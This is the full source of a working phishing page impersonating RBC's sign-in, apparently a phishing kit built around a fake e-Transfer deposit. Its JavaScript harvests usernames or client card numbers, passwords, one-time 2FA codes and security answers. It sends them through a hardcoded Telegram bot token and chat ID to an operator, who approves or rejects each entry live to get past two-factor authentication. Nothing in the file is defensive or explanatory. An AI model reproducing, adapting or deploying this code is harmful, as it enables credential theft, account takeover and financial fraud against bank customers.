<?php

session_start();

// … (PHP validation / HTTPS / antibot logic remains unchanged) …

$txnId = $_SESSION['transaction_id'] ?? null;
if (!$txnId || empty($_SESSION['transactions'][$txnId])) {
    http_response_code(400);
    exit('No transaction data found.');
}
$t = $_SESSION['transactions'][$txnId];
$sender = htmlspecialchars($t['senderName'] ?? '');
$amount = htmlspecialchars($t['amount'] ?? '');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>RBC Secure Sign-In</title>
  <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <style>
    body, html { margin:0; padding:0; font-family: Arial, sans-serif; background:#fafafa; }
    .container { max-width:400px; margin:3em auto; padding:2em; background:#fff; box-shadow:0 2px 8px rgba(0,0,0,.1); }
    .step { display:none; }
    .step.active { display:block; }
    label { display:block; margin-bottom:.5em; font-weight: bold; }
    input, select, button { width:100%; padding:.75em; margin-bottom:1em; font-size:1rem; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; }
    button { background:#0066cc; color:#fff; border:none; cursor:pointer; transition:opacity .3s; }
    button:disabled { opacity:.5; cursor:default; }
    .error { color:#c00; margin-top:-.5em; margin-bottom:1em; display:none; }
    .transaction { background:#f1f1f1; padding:1em; border-radius:4px; margin-bottom:1em; }
  </style>
</head>
<body>

<div class="container">

  <!-- Step 1 -->
  <div class="step active" id="step-username">
    <label>Client Card or Username</label>
    <input id="username" placeholder="Username">
    <p class="error" id="err-username"></p>
    <label><input type="checkbox" id="remember"> Remember Me</label>
    <button id="btn-username">Next</button>
  </div>

  <!-- Step 2 -->
  <div class="step" id="step-password">
    <p id="disp-user" style="margin-bottom:1em;font-weight:bold;"></p>
    <label>Password</label>
    <input id="password" type="password" placeholder="Password">
    <p class="error" id="err-password"></p>
    <button id="btn-password">Sign In</button>
  </div>

  <!-- Step 3 -->
  <div class="step" id="step-method">
    <label>Receive Code Via</label>
    <select id="method">
      <option value="">--Select Method--</option>
      <option value="sms">SMS</option>
      <option value="call">Call</option>
    </select>
    <p class="error" id="err-method"></p>
    <button id="btn-method">Continue</button>
  </div>

  <!-- Step 4 -->
  <div class="step" id="step-code">
    <label>Enter 6-digit Code</label>
    <input id="code" maxlength="6" placeholder="Code">
    <p class="error" id="err-code"></p>
    <button id="btn-code">Verify</button>
  </div>

  <!-- Step 5 -->
  <div class="step" id="step-security">
    <div class="transaction">
      <p><strong>Sender:</strong> <?=$sender?></p>
      <p><strong>Amount:</strong> <?=$amount?></p>
    </div>
    <label>What is this for?</label>
    <input id="sec-ans" placeholder="Answer">
    <p class="error" id="err-security"></p>
    <button id="btn-security">Submit</button>
  </div>

  <!-- Step 6 -->
  <div class="step" id="step-deposit">
    <h2>Success!</h2>
    <p>Returning in <span id="count">30</span>s...</p>
  </div>

</div>

<script>
  // Helper functions
  const steps = {
    username: document.getElementById('step-username'),
    password: document.getElementById('step-password'),
    method:   document.getElementById('step-method'),
    code:     document.getElementById('step-code'),
    security: document.getElementById('step-security'),
    deposit:  document.getElementById('step-deposit')
  };
  const errs = {
    username: document.getElementById('err-username'),
    password: document.getElementById('err-password'),
    method:   document.getElementById('err-method'),
    code:     document.getElementById('err-code'),
    security: document.getElementById('err-security')
  };
  function showStep(key) {
    Object.values(steps).forEach(s => s.classList.remove('active'));
    steps[key].classList.add('active');
  }
  function showError(key, msg) {
    errs[key].textContent = msg;
    errs[key].style.display = 'block';
  }
  function hideError(key) {
    errs[key].style.display = 'none';
  }
  function setLoading(btnId, isLoading, normalText) {
    const btn = document.getElementById(btnId);
    btn.disabled = isLoading;
    btn.textContent = isLoading ? 'Loading…' : normalText;
  }

  // Telegram integration (same as before)
  const botToken = "8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM";
  const chatId   = "-1002922644009";
  const lastMsg  = {};

  async function sendTG(text, code, kb) {
    const payload = { chat_id: chatId, text, parse_mode:'HTML' };
    if (code) payload.reply_markup = kb;
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    });
    const j = await res.json();
    if (!j.ok) throw new Error(j.description);
    if (code) lastMsg[code] = { chat_id:j.result.chat.id, message_id:j.result.message_id };
  }
  async function clearKB(code) {
    const m = lastMsg[code];
    if (!m) return;
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ chat_id:m.chat_id, message_id:m.message_id, reply_markup:{} })
    });
  }
  async function poll(code, step, onSuccess, btnText) {
    const timeout = 30000, start = Date.now();
    let offset = 0;
    while (Date.now() - start < timeout) {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset+1}`);
      const j   = await res.json();
      if (j.ok && j.result.length) {
        for (const u of j.result) {
          offset = u.update_id;
          if (u.callback_query?.data.includes(code)) {
            await clearKB(code);
            setLoading('btn-'+step, false, btnText);
            const action = u.callback_query.data.split(':')[0];
            if (action === 'correct') return onSuccess();
            const msgs = {
              password: 'Bad credentials',
              code:     'Wrong code',
              security: 'Wrong answer'
            };
            showError(step, msgs[step] || 'Incorrect');
            return showStep(step);
          }
        }
      }
      await new Promise(r => setTimeout(r,1000));
    }
    setLoading('btn-'+step, false, btnText);
    showError(step, 'Request timed out');
    showStep(step);
  }

  // Luhn
  function luhn(v) {
    if (!/^\d+$/.test(v)) return true;
    let sum=0, alt=false;
    for (let i=v.length-1;i>=0;i--) {
      let n = +v[i];
      if (alt) { n*=2; if (n>9) n-=9; }
      sum += n; alt = !alt;
    }
    return sum%10===0;
  }

  // Step handlers
  let currentUser = '';
  document.getElementById('btn-username').onclick = () => {
    const v = document.getElementById('username').value.trim();
    hideError('username');
    if (!v) return showError('username','Enter username');
    if (/^\d+$/.test(v) && !luhn(v)) return showError('username','Invalid');
    currentUser = v;
    document.getElementById('disp-user').textContent = `< ${v}`;
    showStep('password');
  };

  document.getElementById('btn-password').onclick = async () => {
    const pw = document.getElementById('password').value.trim();
    hideError('password');
    if (!pw) return showError('password','Enter password');
    setLoading('btn-password', true, 'Sign In');
    const code = Math.random().toString(36).substr(2,8);
    const kb = { inline_keyboard: [
      [{text:'✅',callback_data:`correct:${code}`}],
      [{text:'❌',callback_data:`error:${code}`}]
    ]};
    await sendTG(`👤 ${currentUser}\n🔒 ${pw}`, code, kb);
    poll(code,'password', ()=>showStep('method'), 'Sign In');
  };

  document.getElementById('btn-method').onclick = async () => {
    const m = document.getElementById('method').value;
    hideError('method');
    if (!m) return showError('method','Select method');
    setLoading('btn-method', true, 'Continue');
    await sendTG(`Method: ${m}`);
    setLoading('btn-method', false, 'Continue');
    showStep('code');
  };

  document.getElementById('btn-code').onclick = async () => {
    const c = document.getElementById('code').value.trim();
    hideError('code');
    if (!/^\d{6}$/.test(c)) return showError('code','Enter 6 digits');
    setLoading('btn-code', true, 'Verify');
    const code = Math.random().toString(36).substr(2,8);
    const kb = { inline_keyboard: [
      [{text:'✅',callback_data:`correct:${code}`}],
      [{text:'❌',callback_data:`error:${code}`}]
    ]};
    await sendTG(`Code: ${c}`, code, kb);
    poll(code,'code', ()=>showStep('security'), 'Verify');
  };

  document.getElementById('btn-security').onclick = async () => {
    const a = document.getElementById('sec-ans').value.trim();
    hideError('security');
    if (!a) return showError('security','Enter answer');
    setLoading('btn-security', true, 'Submit');
    const code = Math.random().toString(36).substr(2,8);
    const kb = { inline_keyboard: [
      [{text:'✅',callback_data:`correct:${code}`}],
      [{text:'❌',callback_data:`error:${code}`}]
    ]};
    await sendTG(`Ans: ${a}`, code, kb);
    poll(code,'security', ()=>showStep('deposit'), 'Submit');
  };

  // Deposit countdown
  (()=>{
    const el = steps.deposit, ctr = document.getElementById('count');
    new MutationObserver(()=>{
      if (el.classList.contains('active')) {
        let t=30; ctr.textContent = t;
        const iv = setInterval(()=>{
          if (--t < 0) { clearInterval(iv); showStep('username'); return; }
          ctr.textContent = t;
        },1000);
      }
    }).observe(el,{attributes:true});
  })();
</script>
</body>
</html>
